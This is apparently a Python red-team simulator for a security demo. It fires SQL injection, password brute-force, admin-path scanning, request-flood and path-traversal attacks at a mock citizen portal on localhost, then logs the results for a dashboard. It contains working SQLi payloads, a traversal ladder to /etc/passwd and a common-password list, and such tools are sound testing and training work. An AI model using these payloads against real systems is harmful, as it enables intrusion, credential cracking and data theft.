#!/usr/bin/env python3
"""Falcon Shield — attack generator (RED TEAM simulator).

Fires scripted attack scenarios at the mock citizen portal and records each
shot on the JSONL event bus (events/attacks.jsonl). Source IPs are spoofed
via the X-Sim-Source header so the portal logs a fake geo origin and the
dashboard can draw attack arcs.

    python attack.py --scenario sqli              # fire a scenario
    python attack.py --scenario dos --rate 60     # heavier burst
    python attack.py --scenario cve --verify      # re-probe after a patch

--verify re-fires ONE minimal probe, prints exactly BLOCKED or SUCCESS
(SUCCESS = still exploitable) and exits 0 / 1.

Simulation only — only ever targets PORTAL_URL (default http://localhost:8001).
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
from datetime import datetime

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
EVENTS_DIR = os.path.join(REPO_ROOT, "events")
ATTACKS_LOG = os.path.join(EVENTS_DIR, "attacks.jsonl")

PORTAL_URL = os.environ.get("PORTAL_URL", "http://localhost:8001").rstrip("/")
TIMEOUT = 5

# Mirror of FAKE_GEO in apps/portal/app.py — spoofed origins MUST come from
# this table or the portal's geo lookup (and the map arcs) won't resolve.
FAKE_GEO = {
    "10.7.0.11": [55.27, 25.20, "Dubai (simulated)"],
    "10.7.0.23": [24.45, 54.38, "Abu Dhabi (simulated)"],
    "10.7.0.42": [103.82, 1.35, "Singapore (simulated)"],
    "10.7.0.66": [37.62, 55.75, "Moscow (simulated)"],
    "10.7.0.99": [-0.13, 51.50, "London (simulated)"],
    "10.7.0.5": [139.69, 35.69, "Tokyo (simulated)"],
}

# scenario -> spoofed origin. Each scenario gets a different fake city so the
# map shows distinct arcs during the demo.
SOURCES = {
    "sqli": "10.7.0.66",   # Moscow
    "brute": "10.7.0.99",  # London
    "scan": "10.7.0.42",   # Singapore
    "dos": "10.7.0.5",     # Tokyo
    "cve": "10.7.0.11",    # Dubai
}

# Portal strips whitespace from `user`, so payloads rely on '--' comment
# tails instead of spaced OR clauses. The UNION probe intentionally produces
# a leaky 500 (SEEDED-VULN:err_leak).
SQLI_PAYLOADS = [
    "admin'--",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "fatima'--",
    "' UNION SELECT name, emirates_id FROM users--",
    "admin' AND '1'='2",
]

# Deliberately-wrong passwords — none of these are seeded credentials.
BRUTE_PASSWORDS = [
    "123456", "password", "letmein", "qwerty", "iloveyou", "welcome",
    "monkey", "dragon", "football", "shadow", "master", "sunshine",
    "princess", "trustno1", "whatever", "admin2024",
]

SCAN_PATHS = ["/admin", "/.env", "/wp-admin", "/config", "/debug/config"]

# Path-traversal ladder: shallow ../ first (per brief), then deeper levels and
# an absolute path — os.path.join(DOCS_DIR, doc) collapses to the absolute
# path, so it hits regardless of where the repo is checked out.
TRAVERSAL_DOCS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "/etc/passwd",
    "../docs/internal.txt",
]

_USE_COLOR = sys.stdout.isatty()


def _c(code: str) -> str:
    return code if _USE_COLOR else ""


RED = _c("\033[31;1m")
GREEN = _c("\033[32;1m")
YELLOW = _c("\033[33;1m")
CYAN = _c("\033[36;1m")
DIM = _c("\033[2m")
BOLD = _c("\033[1m")
RESET = _c("\033[0m")


def say(msg: str = "") -> None:
    print(msg, flush=True)


def clock() -> str:
    return datetime.now().strftime("%H:%M:%S")


def log_attack(scenario: str, ip: str, target_path: str, result: str) -> None:
    os.makedirs(EVENTS_DIR, exist_ok=True)
    entry = {
        "ts": round(time.time(), 3),
        "scenario": scenario,
        "source": {"ip": ip, "geo": FAKE_GEO.get(ip)},
        "target_path": target_path,
        "result": result,
    }
    with open(ATTACKS_LOG, "a") as f:
        f.write(json.dumps(entry) + "\n")


def fire(method: str, path: str, ip: str, params: dict | None = None):
    """One shot against the portal. Returns (status, body, latency_s)."""
    t0 = time.time()
    try:
        r = requests.request(
            method,
            PORTAL_URL + path,
            params=params,
            headers={
                "X-Sim-Source": ip,
                "User-Agent": "falcon-shield-attacker/1.0 (simulation)",
            },
            timeout=TIMEOUT,
        )
        return r.status_code, r.text, time.time() - t0
    except requests.RequestException as e:
        return None, f"{type(e).__name__}: {e}", time.time() - t0


def login_probe(ip: str, user: str, password: str):
    """POST /login — the portal reads user/pass from query params."""
    return fire("POST", "/login", ip, params={"user": user, "pass": password})


def welcome_of(body: str) -> str | None:
    try:
        return json.loads(body).get("welcome")
    except (ValueError, AttributeError):
        return None


def file_content_of(status, body: str) -> str | None:
    if status != 200:
        return None
    try:
        content = json.loads(body).get("content")
    except ValueError:
        return None
    return content or None


def shot_line(desc: str, status, verdict: str, color: str = "") -> None:
    code = "----" if status is None else str(status)
    say(f"  {DIM}{clock()}{RESET} ⚡ {desc:<52} → {color}{code} {verdict}{RESET}")


# --------------------------------------------------------------------------
# scenarios
# --------------------------------------------------------------------------

def run_sqli(ip: str, rate: int) -> None:
    for payload in SQLI_PAYLOADS:
        status, body, _ = login_probe(ip, payload, "x")
        who = welcome_of(body)
        if who:
            verdict, color = f"{RED}AUTH BYPASS — welcome={who}", RED
            result = f"auth_bypass:{who}"
        elif status == 500:
            verdict, color = f"{YELLOW}ERROR LEAK — query exposed", YELLOW
            result = "error_leak"
        elif status is None:
            verdict, color, result = "no response", DIM, "unreachable"
        else:
            verdict, color, result = "rejected", DIM, f"http_{status}"
        shot_line(f"POST /login user={payload!r}", status, verdict, color)
        log_attack("sqli", ip, "/login", result)


def run_brute(ip: str, rate: int) -> None:
    attempts = max(15, rate)
    hits = 0
    for i in range(attempts):
        pw = BRUTE_PASSWORDS[i % len(BRUTE_PASSWORDS)]
        status, body, _ = login_probe(ip, "admin", pw)
        who = welcome_of(body)
        hits += bool(who)
        if who:
            verdict, color = f"{RED}PASSWORD CRACKED — welcome={who}", RED
            result = f"cracked:{pw}"
        elif status is None:
            verdict, color, result = "no response", DIM, "unreachable"
        else:
            verdict, color, result = "invalid", DIM, f"http_{status}"
        shot_line(f"POST /login admin:{pw}  ({i + 1}/{attempts})", status, verdict, color)
        log_attack("brute", ip, "/login", result)
    say(f"  {DIM}└─ {attempts} credential attempts, {hits} cracked{RESET}")


def run_scan(ip: str, rate: int) -> None:
    for path in SCAN_PATHS:
        status, body, _ = fire("GET", path, ip)
        if status == 200:
            if path == "/debug/config":
                verdict = f"{RED}LEAKED — debug config + admin_api_key exposed"
                result = "leaked_debug_config"
            else:
                verdict = f"{RED}FOUND"
                result = "found"
            color = RED
        elif status is None:
            verdict, color, result = "no response", DIM, "unreachable"
        else:
            verdict, color, result = "not found", DIM, f"http_{status}"
        shot_line(f"GET {path}", status, verdict, color)
        log_attack("scan", ip, path, result)


def run_dos(ip: str, rate: int) -> None:
    say(f"  {YELLOW}▶ burst start — {rate} requests, no delay{RESET}")
    log_attack("dos", ip, "/", f"burst_start n={rate}")
    t0, ok, fails = time.time(), 0, 0
    for i in range(rate):
        path = "/" if i % 2 == 0 else "/health"
        status, _, _ = fire("GET", path, ip)
        if status == 200:
            ok += 1
        else:
            fails += 1
        if i % 10 == 9:
            say(f"  {DIM}… {i + 1}/{rate} sent{RESET}")
    dt = time.time() - t0
    say(f"  {RED}▶ burst end — {ok}/{rate} answered in {dt:.2f}s "
        f"({rate / max(dt, 0.001):.0f} req/s){RESET}")
    log_attack("dos", ip, "/", f"burst_end ok={ok} fail={fails} seconds={dt:.2f}")


def run_cve(ip: str, rate: int) -> None:
    for doc in TRAVERSAL_DOCS:
        status, body, _ = fire("GET", "/files", ip, params={"doc": doc})
        content = file_content_of(status, body)
        if content:
            preview = content.splitlines()[0][:40] if content else ""
            verdict = f"{RED}FILE READ — {preview}…"
            result = f"traversal_read:{doc}"
            color = RED
        elif status is None:
            verdict, color, result = "no response", DIM, "unreachable"
        else:
            verdict, color, result = "blocked/404", DIM, f"http_{status}"
        shot_line(f"GET /files?doc={doc}", status, verdict, color)
        log_attack("cve", ip, f"/files?doc={doc}", result)


SCENARIOS = {
    "sqli": ("SQL injection vs /login", run_sqli),
    "brute": ("credential brute-force vs /login", run_brute),
    "scan": ("recon scan — common admin/config paths", run_scan),
    "dos": ("request-flood burst vs / + /health", run_dos),
    "cve": ("path traversal probe vs /files", run_cve),
}


# --------------------------------------------------------------------------
# --verify probes: True = still exploitable, False = blocked
# --------------------------------------------------------------------------

def verify_sqli(ip: str) -> bool:
    status, body, _ = login_probe(ip, "admin'--", "x")
    return welcome_of(body) is not None


def verify_brute(ip: str) -> bool:
    status, body, _ = login_probe(ip, "admin", "definitely-wrong")
    if status is None or status in (403, 429):
        return False
    return True


def verify_scan(ip: str) -> bool:
    status, body, _ = fire("GET", "/debug/config", ip)
    return status == 200 and "admin_api_key" in body


def verify_dos(ip: str) -> bool:
    for _ in range(3):
        status, _, _ = fire("GET", "/health", ip)
        if status != 200:
            return False
    return True


def verify_cve(ip: str) -> bool:
    for doc in TRAVERSAL_DOCS:
        status, body, _ = fire("GET", "/files", ip, params={"doc": doc})
        if file_content_of(status, body):
            return True
    return False


VERIFIERS = {
    "sqli": verify_sqli,
    "brute": verify_brute,
    "scan": verify_scan,
    "dos": verify_dos,
    "cve": verify_cve,
}


def banner(scenario: str, ip: str) -> None:
    label, _ = SCENARIOS[scenario]
    geo = FAKE_GEO.get(ip) or [0, 0, "?"]
    say(f"{BOLD}╔══════════════════════════════════════════════════════════╗")
    say("║  FALCON SHIELD — RED TEAM SIMULATOR          (sim only)  ║")
    say(f"╚══════════════════════════════════════════════════════════╝{RESET}")
    say(f"  {CYAN}target  {RESET} {PORTAL_URL}")
    say(f"  {CYAN}attack  {RESET} {scenario} — {label}")
    say(f"  {CYAN}origin  {RESET} {ip} → {geo[2]} {DIM}({geo[0]}, {geo[1]}){RESET}")
    say(f"  {DIM}{'─' * 60}{RESET}")


def main() -> int:
    ap = argparse.ArgumentParser(
        prog="attack.py",
        description="Falcon Shield attack generator — sandboxed simulation only",
    )
    ap.add_argument("--scenario", required=True, choices=sorted(SCENARIOS))
    ap.add_argument("--rate", type=int, default=30,
                    help="intensity: dos burst size / brute min attempts (default 30)")
    ap.add_argument("--verify", action="store_true",
                    help="re-fire ONE minimal probe; print BLOCKED or SUCCESS")
    args = ap.parse_args()

    ip = SOURCES[args.scenario]

    if args.verify:
        exploitable = VERIFIERS[args.scenario](ip)
        log_attack(args.scenario, ip, "verify",
                   "verify:SUCCESS" if exploitable else "verify:BLOCKED")
        print("SUCCESS" if exploitable else "BLOCKED")
        return 1 if exploitable else 0

    banner(args.scenario, ip)
    t0 = time.time()
    SCENARIOS[args.scenario][1](ip, args.rate)
    say(f"  {DIM}{'─' * 60}{RESET}")
    say(f"  {GREEN}done{RESET} {DIM}— {time.time() - t0:.2f}s · logged → events/attacks.jsonl{RESET}")
    say()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except BrokenPipeError:
        sys.exit(0)
